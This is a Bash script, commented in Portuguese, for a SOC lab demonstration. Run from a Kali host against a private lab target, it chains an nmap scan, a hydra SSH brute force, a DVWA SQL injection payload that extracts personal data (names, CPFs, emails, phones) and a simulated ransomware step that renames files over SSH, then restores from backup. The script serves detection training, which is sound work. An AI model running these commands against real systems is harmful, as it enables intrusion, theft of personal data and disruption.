#!/bin/bash
# ============================================================
# SCRIPT DE ATAQUE - SOC CORPORATIVO (OPCAO 5)
# ============================================================
# Executar no Kali Linux (192.168.56.20)
# Alvo: Host Arch Linux em 192.168.56.1
# ============================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET="192.168.56.1"
KALI_IP="192.168.56.20"

check_backup() {
  echo ">>> Verificando se existe snapshot de backup..."
  local result
  result=$(ssh -i /tmp/id_ed25519 -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 "paulo@${TARGET}" \
    "sudo restic snapshots --repo /backup-repo --password-file /etc/restic/passwd --latest 2>/dev/null | grep -c '^[0-9a-f]'" 2>/dev/null || echo "0")
  if [ "$result" -eq 0 ] || [ -z "$result" ]; then
    echo -e "${YELLOW}[AVISO]${NC} Nenhum snapshot encontrado. Execute o backup primeiro:"
    echo "  ssh paulo@${TARGET} sudo /usr/local/bin/backup-clientes-local.sh"
    echo ""
    echo -n "Deseja continuar mesmo assim? (s/N): "
    read -r confirm
    if [ "$confirm" != "s" ] && [ "$confirm" != "S" ]; then
      echo "Abortando."
      exit 1
    fi
  else
    echo -e "${GREEN}[OK]${NC} Snapshot de backup encontrado."
  fi
}
DVWA_URL="http://${TARGET}:8080"

echo -e "${BLUE}============================================${NC}"
echo -e "${BLUE}  SOC CORPORATIVO - CADEIA DE ATAQUE        ${NC}"
echo -e "${BLUE}  Alvo: ${TARGET} (Host - Docker)            ${NC}"
echo -e "${BLUE}============================================${NC}"
echo ""
echo "Pressione ENTER para comecar..."
read -r

# ============================================================
# FASE 1: RECONHECIMENTO (NIST CSF: DE.CM)
# ============================================================
echo ""
echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW} FASE 1: RECONHECIMENTO                     ${NC}"
echo -e "${YELLOW} NIST CSF: DE.CM - Detect                   ${NC}"
echo -e "${YELLOW} ISO 27001: A.16.1.5                        ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

echo ">>> nmap -sT -p 22,80,3306,443,1514 ${TARGET} -Pn"
nmap -sT -p 22,80,3306,443,1514 "${TARGET}" -Pn

echo ""
echo -e "${GREEN}[WAZUH]${NC} Alerta NIST CSF DE.CM - Network scan detected"
echo ""
echo -n "ENTER para FASE 2..."
read -r

# ============================================================
# FASE 2: BRUTE FORCE SSH (NIST CSF: PR.AC / ISO 27001 A.9.4.2)
# ============================================================
echo ""
echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW} FASE 2: BRUTE FORCE SSH                     ${NC}"
echo -e "${YELLOW} NIST CSF: PR.AC - Protect                   ${NC}"
echo -e "${YELLOW} ISO 27001: A.9.4.2 - Secure Log-on          ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

echo ">>> head -n 15 /usr/share/wordlists/rockyou.txt > /tmp/short_wordlist.txt"
head -n 15 /usr/share/wordlists/rockyou.txt > /tmp/short_wordlist.txt
echo ">>> hydra -I -l paulo -P /tmp/short_wordlist.txt ssh://${TARGET} -t 4 -V"
hydra -I -l paulo -P /tmp/short_wordlist.txt "ssh://${TARGET}" -t 4 -V
rm -f /tmp/short_wordlist.txt

echo ""
echo -e "${GREEN}[WAZUH]${NC} Alerta PR.AC / A.9.4.2 - Authentication failures"
echo ""
echo -n "ENTER para FASE 3..."
read -r

# ============================================================
# FASE 3: SQL INJECTION - LGPD (NIST CSF: DE.CM / ISO 27001 A.14.2.1)
# ============================================================
echo ""
echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW} FASE 3: SQL INJECTION - VAZAMENTO LGPD      ${NC}"
echo -e "${YELLOW} NIST CSF: DE.CM - Detect                    ${NC}"
echo -e "${YELLOW} ISO 27001: A.14.2.1 - Secure Development    ${NC}"
echo -e "${YELLOW} LGPD: Art.46/48/49                          ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

echo ">>> Obtendo sessao DVWA..."
HTML=$(curl --connect-timeout 5 -sS -c /tmp/dvwa_cookies.txt "${DVWA_URL}/login.php")
CSRF=$(echo "$HTML" | grep -oP "value='\K[a-f0-9]+")
curl --connect-timeout 5 -sS -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt \
  "${DVWA_URL}/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=${CSRF}" > /dev/null

echo ">>> Extraindo dados pessoais via SQL Injection..."
INJECTION="%27+UNION+SELECT+id%2Cconcat%28nome%2C%27+%7C+%27%2Ccpf%2C%27+%7C+%27%2Cemail%2C%27+%7C+%27%2Ctelefone%29+FROM+clientes.pessoas--+-"
curl --connect-timeout 5 -sS -b /tmp/dvwa_cookies.txt \
  "${DVWA_URL}/vulnerabilities/sqli/?id=${INJECTION}&Submit=Submit" \
  | sed -n '/<pre>/,/<\/pre>/p'

echo ""
echo -e "${RED}[LGPD]${NC} Dados pessoais extraidos: nomes, CPFs, emails, telefones"
echo -e "${GREEN}[WAZUH]${NC} ALERTA CRITICO SID 200031 - LGPD Art.46"
echo ""
echo -n "ENTER para FASE 4..."
read -r

# ============================================================
# FASE 4: RANSOMWARE SIMULADO (NIST CSF: PR.DS)
# ============================================================
echo ""
echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW} FASE 4: RANSOMWARE SIMULADO                 ${NC}"
echo -e "${YELLOW} NIST CSF: PR.DS - Data Security             ${NC}"
echo -e "${YELLOW} ISO 27001: A.12.3.1 - Backup                ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

echo -e "${YELLOW}>>> Verificando backup antes do ataque...${NC}"
check_backup
echo ""

echo ">>> Conectando via SSH e simulando ransomware..."
echo "    (utilizando chave SSH sem senha)"
ssh -i /tmp/id_ed25519 -o StrictHostKeyChecking=no "paulo@${TARGET}" bash -s << 'REMOTE_CMD'
set -euo pipefail
cd /data/clientes

ANTES=$(find . -maxdepth 1 -name '*.txt' -type f | wc -l)
echo "Arquivos .txt encontrados: ${ANTES}"

if [ "${ANTES}" -gt 0 ]; then
  shopt -s nullglob
  for f in *.txt; do
    mv "$f" "$f.encrypted"
  done
  shopt -u nullglob
fi

DEPOIS=$(find . -maxdepth 1 -name '*.encrypted' -type f | wc -l)
echo "Ransomware: ${DEPOIS} arquivos criptografados"
logger "RANSOMWARE_SIMULATED: ${DEPOIS} arquivos criptografados em /data/clientes"
REMOTE_CMD

echo ""
echo -e "${GREEN}[WAZUH]${NC} FIM detectou 100 alteracoes em /data/clientes"
echo ""
echo -n "ENTER para FASE 5..."
read -r

# ============================================================
# FASE 5: RECUPERACAO (NIST CSF: RC.RP)
# ============================================================
echo ""
echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW} FASE 5: DISASTER RECOVERY                   ${NC}"
echo -e "${YELLOW} NIST CSF: RC.RP - Recovery Planning         ${NC}"
echo -e "${YELLOW} ISO 27001: A.12.3.1 - Information Backup    ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

echo ">>> Executando restore de backup..."
echo "    (utilizando chave SSH sem senha)"
ssh -t -i /tmp/id_ed25519 -o StrictHostKeyChecking=no "paulo@${TARGET}" \
  "sudo /usr/local/bin/restore-clientes-local.sh"

echo ""
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}  DEMONSTRACAO CONCLUIDA                      ${NC}"
echo -e "${GREEN}  Wazuh Dashboard: https://${TARGET}:443     ${NC}"
echo -e "${GREEN}============================================${NC}"
